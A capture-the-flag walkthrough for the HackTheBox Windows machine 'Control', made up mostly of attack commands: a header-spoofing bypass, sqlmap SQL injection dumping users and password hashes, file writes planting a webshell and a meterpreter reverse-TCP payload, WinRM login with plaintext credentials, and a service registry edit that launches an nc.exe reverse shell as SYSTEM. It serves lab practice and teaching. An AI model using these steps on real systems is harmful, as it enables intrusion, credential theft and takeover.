---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/SZr1cQTSB-A/0.jpg
layout: post
media_subpath: /assets/posts/2020-04-02-control-hackthebox
tags:
- hackthebox
- registry
- service
- sql injection
- windows
title: Control @ HackTheBox
---

Control is a 40-point windows machine on hackthebox that involves a sql injection which we use to upload a webshell. Then we modify the path of a service executable in the registry to become system.

{% youtube SZr1cQTSB-A %}

## Notes

Header:

```
X-Forwarded-For: 192.168.4.28
```

SQL-Injection:

```
POST /view_product.php HTTP/1.1
Host: control.htb
User-Agent: xct
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://control.htb/admin.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
Connection: close
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 192.168.4.28

productId=32
```

```
sqlmap -r req.txt --level 5 --risk 3 --batch
sqlmap -r req.txt --level 5 --risk 3 --batch --users
sqlmap -r req.txt --level 5 --risk 3 --batch --passwords
```

[p0wny-shell](https://github.com/flozz/p0wny-shell):

```
sqlmap -r req.txt --level 5 --risk 3 --batch --file-write p0wny-shell/shell.php --file-dest 'c:\inetpub\wwwroot\xct_shell.php'
```

Metasploit:

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > shell.php
sqlmap -r req.txt --level 5 --risk 3 --batch --file-write shell.php --file-dest 'c:\inetpub\wwwroot\xct_msf.php'
portfwd add -l 5985 -p 5985 -r <ip>
```

WinRM:

```
$user = "Fidelity\\Hector"
$password = "l33th4x0rhector"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $user,$securePassword
New-PSSession -URI http://localhost:5985/wsman -Credential $credential 
```

Registry:

```
get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "Hector Users Path"
Get-ItemProperty HKLM:\System\CurrentControlSet\services\wuauserv
reg add "HKLM\System\CurrentControlSet\services\wuauserv" /t REG_EXPAND_SZ /v ImagePath /d "C:\programdata\xct\nc.exe <ip> <port> -e cmd" /f
Start-Service wuauserv
```